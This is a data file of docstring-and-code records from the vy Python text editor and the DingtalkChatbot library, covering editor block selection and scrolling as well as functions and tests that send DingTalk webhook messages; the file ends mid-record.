{"docstring": "\"\"\"\nIt adds block selection to the left.\n\"\"\"\n\n", "func_signal": "def block_left(self, event):\n", "code": "a, b   = self.area.indexref('(CURSOR_LAST_COL)')\nc, d   = self.area.indexref()\n\nindex = self.area.index('(BLOCK_SEL_MARK)')\nself.rmblock(index, '%s.%s' % (c, b))\nself.area.left()\n\na, b   = self.area.indexref('(CURSOR_LAST_COL)')\nc, d = self.area.indexref()\n\nself.addblock(index, '%s.%s' % (c, b))", "path": "vy/vyapp/plugins/block_sel.py", "commit_date": "2019-12-28 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nStart block selection.\n\"\"\"\n\n", "func_signal": "def start_block_selection(self, event):\n", "code": "self.area.mark_set('(BLOCK_SEL_MARK)', 'insert')\nroot.status.set_msg('Dropped block selection mark.')", "path": "vy/vyapp/plugins/block_sel.py", "commit_date": "2019-12-28 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nIt inserts one line down from the cursor position.\n\"\"\"\n\n", "func_signal": "def insert_down(self, event):\n", "code": "self.area.edit_separator()\nself.area.insert('insert +1l linestart', '\\n')\nself.area.mark_set('insert', 'insert +1l linestart')\n\nself.area.see('insert')\nself.area.chmode('INSERT')", "path": "vy/vyapp/plugins/line_feed.py", "commit_date": "2018-07-21 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nIt adds/removes block selection to the right.\n\"\"\"\n\n", "func_signal": "def block_right(self, event):\n", "code": "a, b   = self.area.indexref('(CURSOR_LAST_COL)')\nc, d   = self.area.indexref()\n\nindex = self.area.index('(BLOCK_SEL_MARK)')\nself.rmblock(index, '%s.%s' % (c, b))\nself.area.right()\n\na, b   = self.area.indexref('(CURSOR_LAST_COL)')\nc, d = self.area.indexref()\n\nself.addblock(index, '%s.%s' % (c, b))", "path": "vy/vyapp/plugins/block_sel.py", "commit_date": "2019-12-28 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nThis method creates a new horizontal window in which\nit is possible to create new horizontal splits. The argument filename\nis set as attribute for the new AreaVi widget.\n\"\"\"\n\n", "func_signal": "def create(self, filename='none'):\n", "code": "base = PanedHorizontalWindow(master=self)\nself.add(base)\narea = base.create(filename)\nreturn area", "path": "vy/vyapp/panel.py", "commit_date": "2019-12-30 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nIt scrolls one page up.\n\"\"\"\n\n", "func_signal": "def scroll_up(self, event):\n", "code": "self.area.yview(SCROLL, -1, 'page')\nself.area.mark_set('insert', '@0,0')", "path": "vy/vyapp/plugins/page_scroll.py", "commit_date": "2020-06-24 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"  \nIt adds or removes block selection one line up.  \n\"\"\"\n\n", "func_signal": "def block_up(self, event):\n", "code": "a, b   = self.area.indexref('(CURSOR_LAST_COL)')\nc, d   = self.area.indexref()\nindex  = self.area.index('(BLOCK_SEL_MARK)')\n\nself.rmblock(index, '%s.%s' % (c, b))\nself.area.up()\n\na, b = self.area.indexref('(CURSOR_LAST_COL)')\nc, d = self.area.indexref()\n\nself.addblock(index, '%s.%s' % (c, b))", "path": "vy/vyapp/plugins/block_sel.py", "commit_date": "2019-12-28 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nIt creates a horizontal split and loads the content of filename\ninto the new AreaVi instance. It returns the AreaVi widget that\nwas created.\n\"\"\"\n\n", "func_signal": "def load(self, filename):\n", "code": "area = self.create()\narea.load_data(filename)\nreturn area", "path": "vy/vyapp/panel.py", "commit_date": "2019-12-30 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "# Make sure self.funcid is initialized before calling after_cancel.\n# The idea here it is to have <<idle>> spawned once when the user\n# stopped typing.\n\n", "func_signal": "def on_data(self, event):\n", "code": "if self.funcid:\n    self.widget.after_cancel(self.funcid)\nself.funcid = self.widget.after(self.timeout, self.send_idle)", "path": "vy/vyapp/mixins.py", "commit_date": "2020-07-01 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nIt scrolls one line up\n\"\"\"\n\n# should be rewritten.\n# it fails with append.\n\n", "func_signal": "def scroll_up(self, event):\n", "code": "self.area.yview(SCROLL, -1, 'units')\nis_visible = self.area.dlineinfo('insert')\n\nif not is_visible:\n    self.area.mark_set('insert', 'insert -1l')", "path": "vy/vyapp/plugins/line_scroll.py", "commit_date": "2018-07-21 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nFill a LinePicker with a list of options. \n\nWhen display=False it just fills the Line \nPicker for later showing the options with LinePicker.display method.\n\"\"\"\n# Make sure it is a list otherwise it may receive\n# an iterator and display no results even when there are\n# errors.\n", "func_signal": "def  __call__(self, options=[], display=True):\n", "code": "options = list(options)\nranges = zip(('%s - %s:%s' % (msg, relpath(filename), line)\nfor filename, line, msg in options), options)\n\nranges = list(ranges)\nsuper(LinePicker, self).__call__(ranges, display)", "path": "vy/vyapp/widgets.py", "commit_date": "2020-06-23 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\nThis method creates a horizontal AreaVi widget. It returns the\nAreaVi widget that was created. It as well installs the plugins\nthat appear in the vyrc file in the AreaVi widget.\n\"\"\"\n", "func_signal": "def create(self, filename='none'):\n", "code": "frame     = Frame(master=self)\nscrollbar = Scrollbar(master=frame)\narea      = AreaVi(filename, frame , border=3, relief=RAISED, \n                   yscrollcommand=scrollbar.set)\nscrollbar.config(command=area.yview)\nscrollbar.pack(side='right', fill=Y)\n\nfrom vyapp.plugins import HANDLE\n\nfor handle, args, kwargs in HANDLE:\n    handle(area, *args, **kwargs)\n\narea.focus_set()\narea.pack(expand=True, side='left', fill=BOTH)\nself.add(frame)\n\ndef save_focus(event):\n    self.master.focused_area = area\n\nself.master.focused_area = area\narea.bind('<FocusIn>', save_focus)\nreturn area", "path": "vy/vyapp/panel.py", "commit_date": "2019-12-30 00:00:00", "repo_name": "vyapp/vy", "stars": 1153, "license": "mit", "language": "python", "size": 8548}
{"docstring": "\"\"\"\u6d4b\u8bd5\u53d1\u9001\u6574\u4f53\u8df3\u8f6cActionCard\u6d88\u606f\u529f\u80fd\uff08CardItem\u65b0API)\"\"\"\n", "func_signal": "def test_send_actioncard(self):\n", "code": "btns1 = [CardItem(title=\"\u67e5\u770b\u8be6\u60c5\", url=\"https://www.dingtalk.com/\")]\nactioncard1 = ActionCard(title='\u4e07\u4e07\u6ca1\u60f3\u5230\uff0c\u7adf\u7136...',\n                         text='![markdown](http://www.songshan.es/wp-content/uploads/2016/01/Yin-Yang.png) \\n### \u6545\u4e8b\u662f\u8fd9\u6837\u5b50\u7684...',\n                         btns=btns1,\n                         btn_orientation=1,\n                         hide_avatar=1)\nresult = self.xiaoding.send_action_card(actioncard1)\nself.assertEqual(result['errcode'], 0)\n\n\"\"\"\u6d4b\u8bd5\u53d1\u9001\u5355\u72ec\u8df3\u8f6cActionCard\u6d88\u606f\u529f\u80fd\"\"\"\nbtns2 = [CardItem(title=\"\u652f\u6301\", url=\"https://www.dingtalk.com/\"), CardItem(title=\"\u53cd\u5bf9\", url=\"http://www.back china.com/news/2018/01/11/537468.html\")]\nactioncard2 = ActionCard(title='\u4e07\u4e07\u6ca1\u60f3\u5230\uff0c\u7adf\u7136...',\n                         text='![markdown](http://www.songshan.es/wp-content/uploads/2016/01/Yin-Yang.png) \\n### \u6545\u4e8b\u662f\u8fd9\u6837\u5b50\u7684...',\n                         btns=btns2,\n                         btn_orientation=1,\n                         hide_avatar=1)\nresult = self.xiaoding.send_action_card(actioncard2)\nself.assertEqual(result['errcode'], 0)", "path": "DingtalkChatbot/dingtalkchatbot/chatbot_test.py", "commit_date": "2020-03-17 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\n\u6d88\u606f\u94fe\u63a5\u7684\u6253\u5f00\u65b9\u5f0f\n1\u3001\u9ed8\u8ba4\u6216\u4e0d\u8bbe\u7f6e\u65f6\uff0c\u4e3a\u6d4f\u89c8\u5668\u6253\u5f00\uff1apc_slide=False\n2\u3001\u5728PC\u7aef\u4fa7\u8fb9\u680f\u6253\u5f00\uff1apc_slide=True\n\"\"\"\n", "func_signal": "def msg_open_type(self, url):\n", "code": "encode_url = quote_plus(url)\nif self.pc_slide:\n    final_link = 'dingtalk://dingtalkclient/page/link?url={}&pc_slide=true'.format(encode_url)\nelse:\n    final_link = 'dingtalk://dingtalkclient/page/link?url={}&pc_slide=false'.format(encode_url)\nreturn final_link", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\n\u83b7\u53d6ActionCard\u7c7b\u578b\u6d88\u606f\u6570\u636e\uff08\u5b57\u5178\uff09\n:return: \u8fd4\u56deActionCard\u6570\u636e\n\"\"\"\n", "func_signal": "def get_data(self):\n", "code": "if all(map(is_not_null_and_blank_str, [self.title, self.text])) and len(self.btns):\n    if len(self.btns) == 1:\n        # \u6574\u4f53\u8df3\u8f6cActionCard\u7c7b\u578b\n        data = {\n                \"msgtype\": \"actionCard\",\n                \"actionCard\": {\n                    \"title\": self.title,\n                    \"text\": self.text,\n                    \"hideAvatar\": self.hide_avatar,\n                    \"btnOrientation\": self.btn_orientation,\n                    \"singleTitle\": self.btns[0][\"title\"],\n                    \"singleURL\": self.btns[0][\"actionURL\"]\n                }\n        }\n        return data\n    else:\n        # \u72ec\u7acb\u8df3\u8f6cActionCard\u7c7b\u578b\n        data = {\n            \"msgtype\": \"actionCard\",\n            \"actionCard\": {\n                \"title\": self.title,\n                \"text\": self.text,\n                \"hideAvatar\": self.hide_avatar,\n                \"btnOrientation\": self.btn_orientation,\n                \"btns\": self.btns\n            }\n        }\n        return data\nelse:\n    logging.error(\"ActionCard\u7c7b\u578b\uff0c\u6d88\u606f\u6807\u9898\u6216\u5185\u5bb9\u6216\u6309\u94ae\u6570\u91cf\u4e0d\u80fd\u4e3a\u7a7a\uff01\")\n    raise ValueError(\"ActionCard\u7c7b\u578b\uff0c\u6d88\u606f\u6807\u9898\u6216\u5185\u5bb9\u6216\u6309\u94ae\u6570\u91cf\u4e0d\u80fd\u4e3a\u7a7a\uff01\")", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\n\u83b7\u53d6CardItem\u5b50\u63a7\u4ef6\u6570\u636e\uff08\u5b57\u5178\uff09\n@return: \u5b50\u63a7\u4ef6\u7684\u6570\u636e\n\"\"\"\n", "func_signal": "def get_data(self):\n", "code": "if all(map(is_not_null_and_blank_str, [self.title, self.url, self.pic_url])):\n    # FeedCard\u7c7b\u578b\n    data = {\n        \"title\": self.title,\n        \"messageURL\": self.url,\n        \"picURL\": self.pic_url\n    }\n    return data\nelif all(map(is_not_null_and_blank_str, [self.title, self.url])):\n    # ActionCard\u7c7b\u578b\n    data = {\n        \"title\": self.title,\n        \"actionURL\": self.url\n    }\n    return data\nelse:\n    logging.error(\"CardItem\u662fActionCard\u7684\u5b50\u63a7\u4ef6\u65f6\uff0ctitle\u3001url\u4e0d\u80fd\u4e3a\u7a7a\uff1b\u662fFeedCard\u7684\u5b50\u63a7\u4ef6\u65f6\uff0ctitle\u3001url\u3001pic_url\u4e0d\u80fd\u4e3a\u7a7a\uff01\")\n    raise ValueError(\"CardItem\u662fActionCard\u7684\u5b50\u63a7\u4ef6\u65f6\uff0ctitle\u3001url\u4e0d\u80fd\u4e3a\u7a7a\uff1b\u662fFeedCard\u7684\u5b50\u63a7\u4ef6\u65f6\uff0ctitle\u3001url\u3001pic_url\u4e0d\u80fd\u4e3a\u7a7a\uff01\")", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\nActionCard\u521d\u59cb\u5316\n:param title: \u9996\u5c4f\u4f1a\u8bdd\u900f\u51fa\u7684\u5c55\u793a\u5185\u5bb9\n:param text: markdown\u683c\u5f0f\u7684\u6d88\u606f\n:param btns: \u6309\u94ae\u5217\u8868\uff1a\uff081\uff09\u6309\u94ae\u6570\u91cf\u4e3a1\u65f6\uff0c\u6574\u4f53\u8df3\u8f6cActionCard\u7c7b\u578b\uff1b\uff082\uff09\u6309\u94ae\u6570\u91cf\u5927\u4e8e1\u65f6\uff0c\u72ec\u7acb\u8df3\u8f6cActionCard\u7c7b\u578b\uff1b\n:param btn_orientation: 0\uff1a\u6309\u94ae\u7ad6\u76f4\u6392\u5217\uff0c1\uff1a\u6309\u94ae\u6a2a\u5411\u6392\u5217\uff08\u53ef\u9009\uff09\n:param hide_avatar: 0\uff1a\u6b63\u5e38\u53d1\u6d88\u606f\u8005\u5934\u50cf\uff0c1\uff1a\u9690\u85cf\u53d1\u6d88\u606f\u8005\u5934\u50cf\uff08\u53ef\u9009\uff09\n\"\"\"\n", "func_signal": "def __init__(self, title, text, btns, btn_orientation=0, hide_avatar=0):\n", "code": "super(ActionCard, self).__init__()\nself.title = title\nself.text = text\nself.btn_orientation = btn_orientation\nself.hide_avatar = hide_avatar\nbtn_list = []\nfor btn in btns:\n    if isinstance(btn, CardItem):\n        btn_list.append(btn.get_data())\nif btn_list:\n    btns = btn_list  # \u517c\u5bb9\uff1a1\u3001\u4f20\u5165CardItem\u793a\u4f8b\u5217\u8868\uff1b2\u3001\u4f20\u5165\u6570\u636e\u5b57\u5178\u5217\u8868\nself.btns = btns", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\u6d4b\u8bd5\u53d1\u9001FeedCard\u7c7b\u578b\u6d88\u606f\u529f\u80fd(FeedLink\u65e7API)\"\"\"\n", "func_signal": "def test_send_feedcard_old_api(self):\n", "code": "feedlink1 = FeedLink(title=\"\u6c27\u6c14\u7f8e\u5973\", message_url=\"https://www.dingtalk.com/\", pic_url=\"http://pic1.win4000.com/wallpaper/2020-03-11/5e68b0557f3a6.jpg\")\nfeedlink2 = FeedLink(title=\"\u6c27\u773c\u7f8e\u5973\", message_url=\"https://www.dingtalk.com/\", pic_url=\"http://pic1.win4000.com/wallpaper/2020-03-11/5e68b0557f3a6.jpg\")\nfeedlink3 = FeedLink(title=\"\u6c27\u795e\u7f8e\u5973\", message_url=\"https://www.dingtalk.com/\", pic_url=\"http://pic1.win4000.com/wallpaper/2020-03-11/5e68b0557f3a6.jpg\")\nlinks = [feedlink1, feedlink2, feedlink3]\nresult = self.xiaoding.send_feed_card(links)\nself.assertEqual(result['errcode'], 0)", "path": "DingtalkChatbot/dingtalkchatbot/chatbot_test.py", "commit_date": "2020-03-17 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\nActionCard\u7c7b\u578b\n:param action_card: \u6574\u4f53\u8df3\u8f6cActionCard\u7c7b\u578b\u5b9e\u4f8b\u6216\u72ec\u7acb\u8df3\u8f6cActionCard\u7c7b\u578b\u5b9e\u4f8b\n:return: \u8fd4\u56de\u6d88\u606f\u53d1\u9001\u7ed3\u679c\n\"\"\"\n", "func_signal": "def send_action_card(self, action_card):\n", "code": "if isinstance(action_card, ActionCard):\n    data = action_card.get_data()\n    \n    if \"singleURL\" in data[\"actionCard\"]:\n        data[\"actionCard\"][\"singleURL\"] = self.msg_open_type(data[\"actionCard\"][\"singleURL\"])\n    elif \"btns\" in data[\"actionCard\"]:\n        for btn in data[\"actionCard\"][\"btns\"]:\n            btn[\"actionURL\"] = self.msg_open_type(btn[\"actionURL\"])\n    \n    logging.debug(\"ActionCard\u7c7b\u578b\uff1a%s\" % data)\n    return self.post(data)\nelse:\n    logging.error(\"ActionCard\u7c7b\u578b\uff1a\u4f20\u5165\u7684\u5b9e\u4f8b\u7c7b\u578b\u4e0d\u6b63\u786e\uff0c\u5185\u5bb9\u4e3a\uff1a{}\".format(str(action_card)))\n    raise TypeError(\"ActionCard\u7c7b\u578b\uff1a\u4f20\u5165\u7684\u5b9e\u4f8b\u7c7b\u578b\u4e0d\u6b63\u786e\uff0c\u5185\u5bb9\u4e3a\uff1a{}\".format(str(action_card)))", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\u6d4b\u8bd5\u53d1\u9001\u6587\u672c\u6d88\u606f\u51fd\u6570\"\"\"\n", "func_signal": "def test_send_text(self):\n", "code": "result = self.xiaoding.send_text(msg='\u6211\u5c31\u662f\u5c0f\u4e01\uff0c\u5c0f\u4e01\u5c31\u662f\u6211\uff01', is_at_all=True)\nself.assertEqual(result['errcode'], 0)", "path": "DingtalkChatbot/dingtalkchatbot/chatbot_test.py", "commit_date": "2020-03-17 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\nFeedCard\u7c7b\u578b\n:param links: FeedLink\u5b9e\u4f8b\u5217\u8868 or CardItem\u5b9e\u4f8b\u5217\u8868\n:return: \u8fd4\u56de\u6d88\u606f\u53d1\u9001\u7ed3\u679c\n\"\"\"\n", "func_signal": "def send_feed_card(self, links):\n", "code": "if not isinstance(links, list):\n    logging.error(\"FeedLink\u7c7b\u578b\uff1a\u4f20\u5165\u7684\u6570\u636e\u683c\u5f0f\u4e0d\u6b63\u786e\uff0c\u5185\u5bb9\u4e3a\uff1a{}\".format(str(links)))\n    raise ValueError(\"FeedLink\u7c7b\u578b\uff1a\u4f20\u5165\u7684\u6570\u636e\u683c\u5f0f\u4e0d\u6b63\u786e\uff0c\u5185\u5bb9\u4e3a\uff1a{}\".format(str(links)))\n\nlink_list = []\nfor link in links:\n    # \u517c\u5bb9\uff1a1\u3001\u4f20\u5165FeedLink\u5b9e\u4f8b\u5217\u8868\uff1b2\u3001CardItem\u5b9e\u4f8b\u5217\u8868\uff1b\n    if isinstance(link, FeedLink) or isinstance(link, CardItem):\n        link = link.get_data()\n        link['messageURL'] = self.msg_open_type(link['messageURL'])\n        link_list.append(link)\n    else:\n        logging.error(\"FeedLink\u7c7b\u578b\uff0c\u4f20\u5165\u7684\u6570\u636e\u683c\u5f0f\u4e0d\u6b63\u786e\uff0c\u5185\u5bb9\u4e3a\uff1a{}\".format(str(link)))\n        raise ValueError(\"FeedLink\u7c7b\u578b\uff0c\u4f20\u5165\u7684\u6570\u636e\u683c\u5f0f\u4e0d\u6b63\u786e\uff0c\u5185\u5bb9\u4e3a\uff1a{}\".format(str(link)))\n\n\ndata = {\"msgtype\": \"feedCard\", \"feedCard\": {\"links\": link_list}}\nlogging.debug(\"FeedCard\u7c7b\u578b\uff1a%s\" % data)\nreturn self.post(data)", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\nimage\u7c7b\u578b\uff08\u8868\u60c5\uff09\n:param pic_url: \u56fe\u7247\u94fe\u63a5\n:return: \u8fd4\u56de\u6d88\u606f\u53d1\u9001\u7ed3\u679c\n\"\"\"\n", "func_signal": "def send_image(self, pic_url):\n", "code": "if is_not_null_and_blank_str(pic_url):\n    data = {\n        \"msgtype\": \"image\",\n        \"image\": {\n            \"picURL\": pic_url\n        }\n    }\n    logging.debug('image\u7c7b\u578b\uff1a%s' % data)\n    return self.post(data)\nelse:\n    logging.error(\"image\u7c7b\u578b\u4e2d\u56fe\u7247\u94fe\u63a5\u4e0d\u80fd\u4e3a\u7a7a\uff01\")\n    raise ValueError(\"image\u7c7b\u578b\u4e2d\u56fe\u7247\u94fe\u63a5\u4e0d\u80fd\u4e3a\u7a7a\uff01\")", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\u6d4b\u8bd5\u53d1\u9001\u6574\u4f53\u8df3\u8f6cActionCard\u6d88\u606f\u529f\u80fd\uff08\u6570\u636e\u5217\u8868btns\u65e7API)\"\"\"\n", "func_signal": "def test_send_actioncard_old_api(self):\n", "code": "btns1 = [{\"title\": \"\u67e5\u770b\u8be6\u60c5\", \"actionURL\": \"https://www.dingtalk.com/\"}]\nactioncard1 = ActionCard(title='\u4e07\u4e07\u6ca1\u60f3\u5230\uff0c\u7adf\u7136...',\n                         text='![markdown](http://www.songshan.es/wp-content/uploads/2016/01/Yin-Yang.png) \\n### \u6545\u4e8b\u662f\u8fd9\u6837\u5b50\u7684...',\n                         btns=btns1,\n                         btn_orientation=1,\n                         hide_avatar=1)\nresult = self.xiaoding.send_action_card(actioncard1)\nself.assertEqual(result['errcode'], 0)\n\n\"\"\"\u6d4b\u8bd5\u53d1\u9001\u5355\u72ec\u8df3\u8f6cActionCard\u6d88\u606f\u529f\u80fd\"\"\"\nbtns2 = [{\"title\": \"\u652f\u6301\", \"actionURL\": \"https://www.dingtalk.com/\"},\n         {\"title\": \"\u53cd\u5bf9\", \"actionURL\": \"http://www.back china.com/news/2018/01/11/537468.html\"}]\nactioncard2 = ActionCard(title='\u4e07\u4e07\u6ca1\u60f3\u5230\uff0c\u7adf\u7136...',\n                         text='![markdown](http://www.songshan.es/wp-content/uploads/2016/01/Yin-Yang.png) \\n### \u6545\u4e8b\u662f\u8fd9\u6837\u5b50\u7684...',\n                         btns=btns2,\n                         btn_orientation=1,\n                         hide_avatar=1)\nresult = self.xiaoding.send_action_card(actioncard2)\nself.assertEqual(result['errcode'], 0)", "path": "DingtalkChatbot/dingtalkchatbot/chatbot_test.py", "commit_date": "2020-03-17 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\n\u53d1\u9001\u6d88\u606f\uff08\u5185\u5bb9UTF-8\u7f16\u7801\uff09\n:param data: \u6d88\u606f\u6570\u636e\uff08\u5b57\u5178\uff09\n:return: \u8fd4\u56de\u6d88\u606f\u53d1\u9001\u7ed3\u679c\n\"\"\"\n", "func_signal": "def post(self, data):\n", "code": "now = time.time()\n\n# \u9489\u9489\u81ea\u5b9a\u4e49\u673a\u5668\u4eba\u5b89\u5168\u8bbe\u7f6e\u52a0\u7b7e\u65f6\uff0c\u7b7e\u540d\u4e2d\u7684\u65f6\u95f4\u6233\u4e0e\u8bf7\u6c42\u65f6\u4e0d\u80fd\u8d85\u8fc7\u4e00\u4e2a\u5c0f\u65f6\uff0c\u6240\u4ee5\u6bcf\u4e2a1\u5c0f\u65f6\u9700\u8981\u66f4\u65b0\u7b7e\u540d\nif now - self.start_time >= 3600 and self.secret is not None and self.secret.startswith('SEC'):\n    self.start_time = now\n    self.update_webhook()\n\n# \u9489\u9489\u81ea\u5b9a\u4e49\u673a\u5668\u4eba\u73b0\u5728\u6bcf\u5206\u949f\u6700\u591a\u53d1\u900120\u6761\u6d88\u606f\nself.queue.put(now)\nif self.queue.full():\n    elapse_time = now - self.queue.get()\n    if elapse_time < 60:\n        sleep_time = int(60 - elapse_time) + 1\n        logging.debug('\u9489\u9489\u5b98\u65b9\u9650\u5236\u673a\u5668\u4eba\u6bcf\u5206\u949f\u6700\u591a\u53d1\u900120\u6761\uff0c\u5f53\u524d\u53d1\u9001\u9891\u7387\u5df2\u8fbe\u9650\u5236\u6761\u4ef6\uff0c\u4f11\u7720 {}s'.format(str(sleep_time)))\n        time.sleep(sleep_time)\n\ntry:\n    post_data = json.dumps(data)\n    response = requests.post(self.webhook, headers=self.headers, data=post_data)\nexcept requests.exceptions.HTTPError as exc:\n    logging.error(\"\u6d88\u606f\u53d1\u9001\u5931\u8d25\uff0c HTTP error: %d, reason: %s\" % (exc.response.status_code, exc.response.reason))\n    raise\nexcept requests.exceptions.ConnectionError:\n    logging.error(\"\u6d88\u606f\u53d1\u9001\u5931\u8d25\uff0cHTTP connection error!\")\n    raise\nexcept requests.exceptions.Timeout:\n    logging.error(\"\u6d88\u606f\u53d1\u9001\u5931\u8d25\uff0cTimeout error!\")\n    raise\nexcept requests.exceptions.RequestException:\n    logging.error(\"\u6d88\u606f\u53d1\u9001\u5931\u8d25, Request Exception!\")\n    raise\nelse:\n    try:\n        result = response.json()\n    except JSONDecodeError:\n        logging.error(\"\u670d\u52a1\u5668\u54cd\u5e94\u5f02\u5e38\uff0c\u72b6\u6001\u7801\uff1a%s\uff0c\u54cd\u5e94\u5185\u5bb9\uff1a%s\" % (response.status_code, response.text))\n        return {'errcode': 500, 'errmsg': '\u670d\u52a1\u5668\u54cd\u5e94\u5f02\u5e38'}\n    else:\n        logging.debug('\u53d1\u9001\u7ed3\u679c\uff1a%s' % result)\n        # \u6d88\u606f\u53d1\u9001\u5931\u8d25\u63d0\u9192\uff08errcode \u4e0d\u4e3a 0\uff0c\u8868\u793a\u6d88\u606f\u53d1\u9001\u5f02\u5e38\uff09\uff0c\u9ed8\u8ba4\u4e0d\u63d0\u9192\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u6839\u636e\u8fd4\u56de\u7684\u6d88\u606f\u53d1\u9001\u7ed3\u679c\u81ea\u884c\u5224\u65ad\u548c\u5904\u7406\n        if self.fail_notice and result.get('errcode', True):\n            time_now = time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime(time.time()))\n            error_data = {\n              \"msgtype\": \"text\",\n              \"text\": {\n                \"content\": \"[\u6ce8\u610f-\u81ea\u52a8\u901a\u77e5]\u9489\u9489\u673a\u5668\u4eba\u6d88\u606f\u53d1\u9001\u5931\u8d25\uff0c\u65f6\u95f4\uff1a%s\uff0c\u539f\u56e0\uff1a%s\uff0c\u8bf7\u53ca\u65f6\u8ddf\u8fdb\uff0c\u8c22\u8c22!\" % (\n                  time_now, result['errmsg'] if result.get('errmsg', False) else '\u672a\u77e5\u5f02\u5e38')\n                },\n              \"at\": {\n                \"isAtAll\": False\n                }\n              }\n            logging.error(\"\u6d88\u606f\u53d1\u9001\u5931\u8d25\uff0c\u81ea\u52a8\u901a\u77e5\uff1a%s\" % error_data)\n            requests.post(self.webhook, headers=self.headers, data=json.dumps(error_data))\n        return result", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\u6d4b\u8bd5\u53d1\u9001\u94fe\u63a5\u6d88\u606f\u51fd\u6570\"\"\"\n", "func_signal": "def test_send_link(self):\n", "code": "result = self.xiaoding.send_link(title='\u4e07\u4e07\u6ca1\u60f3\u5230\uff0c\u67d0\u5c0f\u7490\u7adf\u7136...', text='\u6545\u4e8b\u662f\u8fd9\u6837\u5b50\u7684...', message_url='http://www.kwongwah.com.my/?p=454748', pic_url='https://pbs.twimg.com/media/CEwj7EDWgAE5eIF.jpg')\nself.assertEqual(result['errcode'], 0)", "path": "DingtalkChatbot/dingtalkchatbot/chatbot_test.py", "commit_date": "2020-03-17 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\ntext\u7c7b\u578b\n:param msg: \u6d88\u606f\u5185\u5bb9\n:param is_at_all: @\u6240\u6709\u4eba\u65f6\uff1atrue\uff0c\u5426\u5219\u4e3afalse\uff08\u53ef\u9009\uff09\n:param at_mobiles: \u88ab@\u4eba\u7684\u624b\u673a\u53f7\uff08\u6ce8\u610f\uff1a\u53ef\u4ee5\u5728msg\u5185\u5bb9\u91cc\u81ea\u5b9a\u4e49@\u624b\u673a\u53f7\u7684\u4f4d\u7f6e\uff0c\u4e5f\u652f\u6301\u540c\u65f6@\u591a\u4e2a\u624b\u673a\u53f7\uff0c\u53ef\u9009\uff09\n:param at_dingtalk_ids: \u88ab@\u4eba\u7684dingtalkId\uff08\u53ef\u9009\uff09\n:param is_auto_at: \u662f\u5426\u81ea\u52a8\u5728msg\u5185\u5bb9\u672b\u5c3e\u6dfb\u52a0@\u624b\u673a\u53f7\uff0c\u9ed8\u8ba4\u81ea\u52a8\u6dfb\u52a0\uff0c\u53ef\u8bbe\u7f6e\u4e3aFalse\u53d6\u6d88\uff08\u53ef\u9009\uff09\n:return: \u8fd4\u56de\u6d88\u606f\u53d1\u9001\u7ed3\u679c\n\"\"\"\n", "func_signal": "def send_text(self, msg, is_at_all=False, at_mobiles=[], 